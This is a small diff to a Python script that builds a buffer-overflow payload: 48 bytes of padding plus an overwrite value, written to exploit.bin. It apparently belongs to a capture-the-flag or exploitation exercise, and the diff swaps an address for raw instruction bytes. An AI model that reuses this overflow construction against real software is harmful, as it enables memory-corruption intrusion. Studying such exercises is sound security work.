@@ -16,7 +16,8 @@ PORT = 1234
 offset = b"A"*48
 #ebpfalg = b"\xb3\xba\x37\x13"
 #0040206c
-ebpflag = b"\x6c\x20\x40\x00"
+#48 8d 3d ec 0d 00 0
+ebpflag = b"\x48\x8d\x3d\xec\x0d"
 exploit = offset + ebpflag
 f = open("exploit.bin", "wb")
 f.write(exploit)
